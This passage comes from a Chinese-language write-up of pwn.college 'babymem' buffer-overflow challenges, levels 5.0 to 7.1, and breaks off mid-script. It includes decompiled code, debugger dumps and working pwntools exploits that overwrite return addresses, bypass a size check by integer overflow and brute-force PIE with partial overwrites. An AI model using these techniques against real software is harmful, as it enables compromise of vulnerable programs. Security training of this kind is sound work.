    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)buf + 8,
    98);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 98);
  puts("and 8 that will overwrite the return address).\n");
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the canary is disabled, otherwise you would corrupt it before");
  puts("overwriting the return address, and the program would abort.");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  puts("This challenge will let you send multiple payload records concatenated together.");
  puts("It will make sure that the total payload size fits in the allocated buffer");
  puts("on the stack. Can you send a carefully crafted input to break this calculation?");
  printf("Number of payload records to send: ");
  __isoc99_scanf("%u", &v9);
  if ( !v9 )
    __assert_fail("record_num > 0", "/challenge/babymem-level-5-0.c", 0x8Fu, "challenge");
  printf("Size of each payload record: ");
  __isoc99_scanf("%u", &v8);
  if ( !v8 )
    __assert_fail("record_size > 0", "/challenge/babymem-level-5-0.c", 0x92u, "challenge");
  if ( v8 * v9 > 0x62 )
    __assert_fail("record_size * record_num <= 98", "/challenge/babymem-level-5-0.c", 0x93u, "challenge");
  nbytes = v8 * (unsigned __int64)v9;
  printf("Computed total payload size: %lu\n", nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 98);
  printf("Of these, you will overwrite %d bytes into the return address.\n", nbytes + (_DWORD)buf - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("You will want to overwrite the return value from challenge()");
  printf("(located at %p, %d bytes past the start of the input buffer)\n", (const void *)rp_, rp_ - (_DWORD)buf);
  printf("with %p, which is the address of the win() function.\n", win);
  puts("This will cause challenge() to return directly into the win() function,");
  puts("which will in turn give you the flag.");
  puts("Keep in mind that you will need to write the address of the win() function");
  puts("in little-endian (bytes backwards) so that it is interpreted properly.\n");
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v12 = read(0, buf, nbytes);
  if ( v12 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v12);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the address of win() is %p.\n", win);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win() when it returns.");
  printf("Let's try it now!\n\n");
  puts("Goodbye!");
  return 0LL;
}
```

首先，两个 `__isoc99_scanf` 都读取无符号数，易想到补码性质和隐式转换问题。其次，读取输入后两条 `if` 分别判断两个 `__isoc99_scanf` 输入是否等于零，为零就断言失败。最后，不能满足 `v8 * v9 > 0x62` 这条判断，也就是输入的两个有符号数相乘（通过反汇编得知这里的乘法使用 `imul`）的结果必须小于等于 98，否则也会断言失败。

通过程序给出的提示信息我们已经知道 payload 的大小为 144 bytes，所以我们要做的就是想办法满足在 `v8 * v9 > 0x62` 不成立的前提下获得起码 144 bytes 的输入大小。因为最后 `read` 的输入的大小是通过 `nbytes = v8 * (unsigned __int64)v9;` 设置的，所以我们只要关注 `v8`、`v9` 的选择。

如果我们输入两个 `-1`，那确实绕过了 `v8 * v9 > 0x62`。但是调试发现 `nbytes` 超出 `ssize_t` 的大小（显然 `0xfffffffe00000001 > 2**63-1`）会导致 `read` 不会读取任何数据，直接返回 `-1`，最后程序抛出异常并退出：

```asm wrap=false showLineNumbers=false del={28, 65, 85-87} collapse={5-24, 29-58, 69-81, 91-114}
pwndbg> c
Continuing.

Breakpoint 2, 0x000000000040291c in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0x7ffd77ce3510 ◂— 0
 RBX  0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
 RCX  0
*RDX  0xfffffffe00000001
*RDI  0
*RSI  0x7ffd77ce3510 ◂— 0
*R8   0x75
*R9   0xffffffec
 R10  0
*R11  0x202
 R12  1
 R13  0
 R14  0x796eb2ce0000 (_rtld_global) —▸ 0x796eb2ce12e0 ◂— 0
 R15  0
 RBP  0x7ffd77ce3590 —▸ 0x7ffd77ce45c0 —▸ 0x7ffd77ce4660 —▸ 0x7ffd77ce46c0 ◂— 0
 RSP  0x7ffd77ce34e0 ◂— 0xa /* '\n' */
*RIP  0x40291c (challenge+1342) ◂— call 0x401170
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x40291c <challenge+1342>    call   read@plt                    <read@plt>
        fd: 0 (pipe:[419970])
        buf: 0x7ffd77ce3510 ◂— 0
        nbytes: 0xfffffffe00000001

   0x402921 <challenge+1347>    mov    dword ptr [rbp - 0x14], eax
   0x402924 <challenge+1350>    cmp    dword ptr [rbp - 0x14], 0
   0x402928 <challenge+1354>    jns    challenge+1400              <challenge+1400>

   0x40292a <challenge+1356>    call   __errno_location@plt        <__errno_location@plt>

   0x40292f <challenge+1361>    mov    eax, dword ptr [rax]
   0x402931 <challenge+1363>    mov    edi, eax
   0x402933 <challenge+1365>    call   strerror@plt                <strerror@plt>

   0x402938 <challenge+1370>    mov    rsi, rax
   0x40293b <challenge+1373>    lea    rdi, [rip + 0x147e]     RDI => 0x403dc0 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x402942 <challenge+1380>    mov    eax, 0                  EAX => 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd77ce34e0 ◂— 0xa /* '\n' */
01:0008│-0a8     0x7ffd77ce34e8 —▸ 0x7ffd77ce46f8 —▸ 0x7ffd77ce55d8 ◂— 'MOTD_SHOWN=pam'
02:0010│-0a0     0x7ffd77ce34f0 —▸ 0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
03:0018│-098     0x7ffd77ce34f8 ◂— 0x100000000
04:0020│-090     0x7ffd77ce3500 —▸ 0x7ffd77ce3520 ◂— 0
05:0028│-088     0x7ffd77ce3508 ◂— 0xffffffffffffffff
06:0030│ rax rsi 0x7ffd77ce3510 ◂— 0
07:0038│-078     0x7ffd77ce3518 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40291c challenge+1342
   1         0x402b32 main+198
   2   0x796eb2aade08
   3   0x796eb2aadecc __libc_start_main+140
   4         0x4011fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.

Breakpoint 3, 0x0000000000402921 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0xffffffffffffffff
 RBX  0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
*RCX  0x796eb2b93c21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0xffffffffffffff88
 RDI  0
 RSI  0x7ffd77ce3510 ◂— 0
 R8   0x75
 R9   0xffffffec
 R10  0
*R11  0x246
 R12  1
 R13  0
 R14  0x796eb2ce0000 (_rtld_global) —▸ 0x796eb2ce12e0 ◂— 0
 R15  0
 RBP  0x7ffd77ce3590 —▸ 0x7ffd77ce45c0 —▸ 0x7ffd77ce4660 —▸ 0x7ffd77ce46c0 ◂— 0
 RSP  0x7ffd77ce34e0 ◂— 0xa /* '\n' */
*RIP  0x402921 (challenge+1347) ◂— mov dword ptr [rbp - 0x14], eax
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x40291c <challenge+1342>    call   read@plt                    <read@plt>

 ► 0x402921 <challenge+1347>    mov    dword ptr [rbp - 0x14], eax     [0x7ffd77ce357c] => 0xffffffff
   0x402924 <challenge+1350>    cmp    dword ptr [rbp - 0x14], 0       0xffffffff - 0x0     EFLAGS => 0x286 [ cf PF af zf SF IF df of ]
   0x402928 <challenge+1354>    jns    challenge+1400              <challenge+1400>

   0x40292a <challenge+1356>    call   __errno_location@plt        <__errno_location@plt>

   0x40292f <challenge+1361>    mov    eax, dword ptr [rax]
   0x402931 <challenge+1363>    mov    edi, eax
   0x402933 <challenge+1365>    call   strerror@plt                <strerror@plt>

   0x402938 <challenge+1370>    mov    rsi, rax
   0x40293b <challenge+1373>    lea    rdi, [rip + 0x147e]     RDI => 0x403dc0 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x402942 <challenge+1380>    mov    eax, 0                  EAX => 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd77ce34e0 ◂— 0xa /* '\n' */
01:0008│-0a8 0x7ffd77ce34e8 —▸ 0x7ffd77ce46f8 —▸ 0x7ffd77ce55d8 ◂— 'MOTD_SHOWN=pam'
02:0010│-0a0 0x7ffd77ce34f0 —▸ 0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
03:0018│-098 0x7ffd77ce34f8 ◂— 0x100000000
04:0020│-090 0x7ffd77ce3500 —▸ 0x7ffd77ce3520 ◂— 0
05:0028│-088 0x7ffd77ce3508 ◂— 0xffffffffffffffff
06:0030│ rsi 0x7ffd77ce3510 ◂— 0
07:0038│-078 0x7ffd77ce3518 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x402921 challenge+1347
   1         0x402b32 main+198
   2   0x796eb2aade08
   3   0x796eb2aadecc __libc_start_main+140
   4         0x4011fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

查看 `read` 的定义，让我忍不住想吐槽这奇葩的设计：为了能够返回有符号数错误码，返回值类型被设置为 `ssize_t`，但是可接收的最大输入值类型为 `size_t`。显然 `ssize_t < size_t`，也就是说我们提供的输入大小可能超出返回值（输入进去的数据的大小）的可承载范围，如果超出了就抛出 `-1`。但又没有办法做到返回值类型和最大输入类型的匹配，如果返回值类型改成 `size_t` 就会出现错误码和输入大小混淆的问题；如果最大输入大小类型改成 `ssize_t` 又很不合理，因为我们显然不能输入大小为负的内容。

```c
// attributes: thunk
ssize_t read(int fd, void *buf, size_t nbytes)
{
  return read(fd, buf, nbytes);
}
```

言归正传，既然我们不能通过最方便的两个 `-1` 解决问题，那么下面就思考一下整数溢出的其它特点。

我们注意到在判断 `v8 * v9 > 0x62` 的时候做的都是 32 bits 运算：

```asm wrap=false showLineNumbers=false
 ► 0x40277d <challenge+927>    mov    edx, dword ptr [rbp - 0x88]     EDX, [0x7ffcfb641768] => 0xffffffff
   0x402783 <challenge+933>    mov    eax, dword ptr [rbp - 0x84]     EAX, [0x7ffcfb64176c] => 0xffffffff
   0x402789 <challenge+939>    imul   eax, edx
   0x40278c <challenge+942>    cmp    eax, 0x62                       0x1 - 0x62     EFLAGS => 0x297 [ CF PF AF zf SF IF df of ]
   0x40278f <challenge+945>  ✔ jbe    challenge+978               <challenge+978>
```

两个 `-1` 行不通是因为它们相乘得到的无符号结果太大了，超出了 `ssize_t` 的可容纳范围。那有没有两个数可以在绕过 `v8 * v9 > 0x62` 且乘积的无符号表示大小不低于 144 的前提下又保证处于 `ssize_t` 的范围呢？

如果我们提供的输入是 `INT32_MAX`，或者 `INT32_MIN`，和 `2`，或其它任何满足 `(v8 * v9) & 0xffffffff == 0x0` 的一对数，就可以巧妙的绕过 `v8 * v9 > 0x62` 的判断了！

这用到了整数溢出的原理，`INT32_MAX * 2` 或者 `INT32_MIN * 2` 都会溢出到更高位，低位就变成 0 了。而我们在做判断的时候只使用了低 32 bits，不关心高位的情况，那么只要让低 32 bits 的大小小于等于 `0x62` 即可。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-5-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+927
b *challenge+1326
b *challenge+1342
b *challenge+1347
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch(debug=False)

payload = b"".ljust(136, b"A") + p64(0x4022D7)

INT32_MAX = str((2**31)).encode()

target.recvuntil(b"Number of payload records to send: ")
target.sendline(INT32_MAX)
target.recvuntil(b"Size of each payload record: ")
target.sendline(b"2")
target.sendline(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{AcH-0L9UpmOONC81mhni9OzJVhD.01N5IDL5cTNxgzW}`

# Level 5.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!

## Write-up

```c {22, 26} ins={23-24, 27-30} del={31, 33} collapse={1-18, 37-43}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  unsigned int v3; // [rsp+28h] [rbp-98h] BYREF
  unsigned int v4; // [rsp+2Ch] [rbp-94h] BYREF
  _QWORD v5[14]; // [rsp+30h] [rbp-90h] BYREF
  int v6; // [rsp+A0h] [rbp-20h]
  __int16 v7; // [rsp+A4h] [rbp-1Ch]
  char v8; // [rsp+A6h] [rbp-1Ah]
  int v9; // [rsp+ACh] [rbp-14h]
  size_t nbytes; // [rsp+B0h] [rbp-10h]
  void *buf; // [rsp+B8h] [rbp-8h]

  memset(v5, 0, sizeof(v5));
  v6 = 0;
  v7 = 0;
  v8 = 0;
  buf = v5;
  nbytes = 0LL;
  printf("Number of payload records to send: ");
  __isoc99_scanf("%u", &v4);
  if ( !v4 )
    __assert_fail("record_num > 0", "/challenge/babymem-level-5-1.c", 0x49u, "challenge");
  printf("Size of each payload record: ");
  __isoc99_scanf("%u", &v3);
  if ( !v3 )
    __assert_fail("record_size > 0", "/challenge/babymem-level-5-1.c", 0x4Cu, "challenge");
  if ( v3 * v4 > 0x77 )
    __assert_fail("record_size * record_num <= 119", "/challenge/babymem-level-5-1.c", 0x4Du, "challenge");
  nbytes = v3 * (unsigned __int64)v4;
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v9 = read(0, buf, nbytes);
  if ( v9 < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  puts("Goodbye!");
  return 0LL;
}
```

不写了不写了，和上一题思路一样，自己去调试查 `win` 地址和 padding 大小就好啦～

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-5-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x98, b"A") + p64(0x401A48)

INT32_MAX = str((2**31)).encode()

target.recvuntil(b"Number of payload records to send: ")
target.sendline(INT32_MAX)
target.recvuntil(b"Size of each payload record: ")
target.sendline(b"2")
target.sendline(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{A2rdZkIDLVjvpTrAPvlwpllVi7m.0FO5IDL5cTNxgzW}`

# Level 6.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!

## Write-up

```c ins={8} collapse={1-4, 12-35}
void __fastcall win_authed(int a1)
{
  int *v1; // rax
  char *v2; // rax
  int *v3; // rax
  char *v4; // rax

  if ( a1 == 0x1337 )
  {
    puts("You win! Here is your flag:");
    flag_fd_5715 = open("/flag", 0);
    if ( flag_fd_5715 < 0 )
    {
      v1 = __errno_location();
      v2 = strerror(*v1);
      printf("\n  ERROR: Failed to open the flag -- %s!\n", v2);
      if ( geteuid() )
      {
        puts("  Your effective user id is not 0!");
        puts("  You must directly run the suid binary in order to have the correct permissions!");
      }
      exit(-1);
    }
    flag_length_5716 = read(flag_fd_5715, &flag_5714, 0x100uLL);
    if ( flag_length_5716 <= 0 )
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
      exit(-1);
    }
    write(1, &flag_5714, flag_length_5716);
    puts("\n");
  }
}
```

思路是覆盖返回地址，返回到 `win_authed`。但是由于 `win_authed` 会先检查传入参数是否为 `0x1337`，匹配才给 flag，所以我们光返回到 `win_authed` 还不够。要么想办法传入参数 `0x1337`，要么返回到 `if` 判断之后的指令，直接跳过执行判断的部分。这里我们使用第二种方法。

```c
void __fastcall win_authed(int a1)
{
  if ( a1 == 0x1337 ) { /* ... */ }
}
```

```asm wrap=false showLineNumbers=false ins={7-9} collapse={3-3, 13-67} "0x00000000004019a3"
pwndbg> disass win_authed
Dump of assembler code for function win_authed:
   0x0000000000401987 <+0>: endbr64
   0x000000000040198b <+4>: push   rbp
   0x000000000040198c <+5>: mov    rbp,rsp
   0x000000000040198f <+8>: sub    rsp,0x10
   0x0000000000401993 <+12>: mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401996 <+15>: cmp    DWORD PTR [rbp-0x4],0x1337
   0x000000000040199d <+22>: jne    0x401aa1 <win_authed+282>
   0x00000000004019a3 <+28>: lea    rdi,[rip+0x1746]        # 0x4030f0
   0x00000000004019aa <+35>: call   0x401110 <puts@plt>
   0x00000000004019af <+40>: mov    esi,0x0
   0x00000000004019b4 <+45>: lea    rdi,[rip+0x1751]        # 0x40310c
   0x00000000004019bb <+52>: mov    eax,0x0
   0x00000000004019c0 <+57>: call   0x401170 <open@plt>
   0x00000000004019c5 <+62>: mov    DWORD PTR [rip+0x4675],eax        # 0x406040 <flag_fd.5715>
   0x00000000004019cb <+68>: mov    eax,DWORD PTR [rip+0x466f]        # 0x406040 <flag_fd.5715>
   0x00000000004019d1 <+74>: test   eax,eax
   0x00000000004019d3 <+76>: jns    0x401a22 <win_authed+155>
   0x00000000004019d5 <+78>: call   0x401100 <__errno_location@plt>
   0x00000000004019da <+83>: mov    eax,DWORD PTR [rax]
   0x00000000004019dc <+85>: mov    edi,eax
   0x00000000004019de <+87>: call   0x4011a0 <strerror@plt>
   0x00000000004019e3 <+92>: mov    rsi,rax
   0x00000000004019e6 <+95>: lea    rdi,[rip+0x172b]        # 0x403118
   0x00000000004019ed <+102>: mov    eax,0x0
   0x00000000004019f2 <+107>: call   0x401130 <printf@plt>
   0x00000000004019f7 <+112>: call   0x401140 <geteuid@plt>
   0x00000000004019fc <+117>: test   eax,eax
   0x00000000004019fe <+119>: je     0x401a18 <win_authed+145>
   0x0000000000401a00 <+121>: lea    rdi,[rip+0x1741]        # 0x403148
   0x0000000000401a07 <+128>: call   0x401110 <puts@plt>
   0x0000000000401a0c <+133>: lea    rdi,[rip+0x175d]        # 0x403170
   0x0000000000401a13 <+140>: call   0x401110 <puts@plt>
   0x0000000000401a18 <+145>: mov    edi,0xffffffff
   0x0000000000401a1d <+150>: call   0x401190 <exit@plt>
   0x0000000000401a22 <+155>: mov    eax,DWORD PTR [rip+0x4618]        # 0x406040 <flag_fd.5715>
   0x0000000000401a28 <+161>: mov    edx,0x100
   0x0000000000401a2d <+166>: lea    rsi,[rip+0x462c]        # 0x406060 <flag.5714>
   0x0000000000401a34 <+173>: mov    edi,eax
   0x0000000000401a36 <+175>: call   0x401150 <read@plt>
   0x0000000000401a3b <+180>: mov    DWORD PTR [rip+0x471f],eax        # 0x406160 <flag_length.5716>
   0x0000000000401a41 <+186>: mov    eax,DWORD PTR [rip+0x4719]        # 0x406160 <flag_length.5716>
   0x0000000000401a47 <+192>: test   eax,eax
   0x0000000000401a49 <+194>: jg     0x401a77 <win_authed+240>
   0x0000000000401a4b <+196>: call   0x401100 <__errno_location@plt>
   0x0000000000401a50 <+201>: mov    eax,DWORD PTR [rax]
   0x0000000000401a52 <+203>: mov    edi,eax
   0x0000000000401a54 <+205>: call   0x4011a0 <strerror@plt>
   0x0000000000401a59 <+210>: mov    rsi,rax
   0x0000000000401a5c <+213>: lea    rdi,[rip+0x1765]        # 0x4031c8
   0x0000000000401a63 <+220>: mov    eax,0x0
   0x0000000000401a68 <+225>: call   0x401130 <printf@plt>
   0x0000000000401a6d <+230>: mov    edi,0xffffffff
   0x0000000000401a72 <+235>: call   0x401190 <exit@plt>
   0x0000000000401a77 <+240>: mov    eax,DWORD PTR [rip+0x46e3]        # 0x406160 <flag_length.5716>
   0x0000000000401a7d <+246>: cdqe
   0x0000000000401a7f <+248>: mov    rdx,rax
   0x0000000000401a82 <+251>: lea    rsi,[rip+0x45d7]        # 0x406060 <flag.5714>
   0x0000000000401a89 <+258>: mov    edi,0x1
   0x0000000000401a8e <+263>: call   0x401120 <write@plt>
   0x0000000000401a93 <+268>: lea    rdi,[rip+0x1758]        # 0x4031f2
   0x0000000000401a9a <+275>: call   0x401110 <puts@plt>
   0x0000000000401a9f <+280>: jmp    0x401aa2 <win_authed+283>
   0x0000000000401aa1 <+282>: nop
   0x0000000000401aa2 <+283>: leave
   0x0000000000401aa3 <+284>: ret
End of assembler dump.
pwndbg>
```

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-6-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x58, b"A") + p64(0x4019A3)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil("Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{AusQ-DCHaivq4M4Tj9IZIsDv7m8.0VO5IDL5cTNxgzW}`

# Level 6.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!

## Write-up

和上一题一样，只是需要计算一下 padding 大小和看一下返回到哪里，这里就不多赘述了。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-6-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x88, b"A") + p64(0x401DB0)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil("Send your payload")
target.send(payload)

target.recvall()
```

## Flag

Flag: `pwn.college{Mlgp6gl7Ogp1vkjstLEXXOSldEM.0FMwMDL5cTNxgzW}`

# Level 7.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!

## Write-up

这题和前两题差不多，都是计算 padding 和覆盖返回地址，唯一的区别在于它启用了 PIE 保护，导致我们无法知道确切的返回地址。这里我们通过 `Partial Write` 的方式绕过 PIE。

`Partial Write` 利用了操作系统加载程序时总是将程序加载到随机的内存页，通常内存页是 `0x1000` 字节，4 KB 对齐的，也就是说程序内部指令的偏移量都不可能超出这个范围，不够就分配到下一个内存页，比如 `0x2000`。所以开启了 PIE 的程序，尽管每次运行都被分配到不同的内存页，但它们在内存页中的偏移地址，也就是最后 3 nibbles 始终是相同的。利用这一点，我们只需要覆盖这最后 3 nibbles 即可达到控制返回地址的效果。

但由于我们没办法写入半个字节，所以我们需要猜一个 nibble，范围是 `[0x0, 0xf]`。将它和固定的 3 nibbles 组合输入到程序，如果地址匹配就成功跳转了。

下面看看开启 PIE 后的效果（每次运行都会随机分配基地址，但最后 3 nibbles 偏移地址始终是固定的）。

**Run 1:**

```asm wrap=false showLineNumbers=false "0x6123056c8000"
pwndbg> piebase
Calculated VA from /home/cub3y0nd/Projects/pwn.college/babymem-level-7-0 = 0x6123056c8000
pwndbg> i fun main
All functions matching regular expression "main":

Non-debugging symbols:
0x00006123056ca3c3  main
0x00007149f9ca4e40  __libc_start_main
0x00007149f9cb4b70  bindtextdomain
0x00007149f9cb4bb0  bind_textdomain_codeset
0x00007149f9cb86b0  textdomain
0x00007149f9d026c0  _IO_switch_to_main_wget_area
0x00007149f9d8e0b0  getdomainname
0x00007149f9d95d00  setdomainname
0x00007149f9da4b90  __getdomainname_chk
0x00007149f9db6940  __res_nquerydomain
0x00007149f9db6940  res_nquerydomain
0x00007149f9db69f0  __res_querydomain
0x00007149f9db69f0  res_querydomain
pwndbg> i fun challenge
All functions matching regular expression "challenge":

Non-debugging symbols:
0x00006123056c9d0b  challenge
pwndbg> i fun win_authed
All functions matching regular expression "win_authed":

Non-debugging symbols:
0x00006123056c9bee  win_authed
pwndbg>
```

**Run 2:**

```asm wrap=false showLineNumbers=false "0x622fffad3000"
pwndbg> piebase
Calculated VA from /home/cub3y0nd/Projects/pwn.college/babymem-level-7-0 = 0x622fffad3000
pwndbg> i fun main
All functions matching regular expression "main":

Non-debugging symbols:
0x0000622fffad53c3  main
0x0000781a2c3f4e40  __libc_start_main
0x0000781a2c404b70  bindtextdomain
0x0000781a2c404bb0  bind_textdomain_codeset
0x0000781a2c4086b0  textdomain
0x0000781a2c4526c0  _IO_switch_to_main_wget_area
0x0000781a2c4de0b0  getdomainname
0x0000781a2c4e5d00  setdomainname
0x0000781a2c4f4b90  __getdomainname_chk
0x0000781a2c506940  __res_nquerydomain
0x0000781a2c506940  res_nquerydomain
0x0000781a2c5069f0  __res_querydomain
0x0000781a2c5069f0  res_querydomain
pwndbg> i fun challenge
All functions matching regular expression "challenge":

Non-debugging symbols:
0x0000622fffad4d0b  challenge
pwndbg> i fun win_authed
All functions matching regular expression "win_authed":

Non-debugging symbols:
0x0000622fffad4bee  win_authed
pwndbg>
```

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, log, pause, process, random, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-7-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding_size = 0x38
fixed_offset = b"\x0a"
possible_bytes = [bytes([i]) for i in range(0x0C, 0x10C, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")

        return False


while True:
    try:
        target = launch()

        payload = b"A" * padding_size
        payload += fixed_offset + random.choice(possible_bytes)
        log.info(f"Trying payload: {payload.hex()}")

        if send_payload(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{0svlAHsYG0L-ONps0VQ3ssICrbb.0VMwMDL5cTNxgzW}`

# Level 7.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!

## Write-up

和上一题一样的，这里就不多赘述了。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, log, pause, process, random, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-7-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


padding_size = 0x88
fixed_offset = b"\x3d"
possible_bytes = [bytes([i]) for i in range(0x08, 0x108, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


while True:
    try:
        target = launch()

        payload = b"A" * padding_size
        payload += fixed_offset + random.choice(possible_bytes)
        log.info(f"Trying payload: {payload.hex()}")

        if send_payload(target, payload):
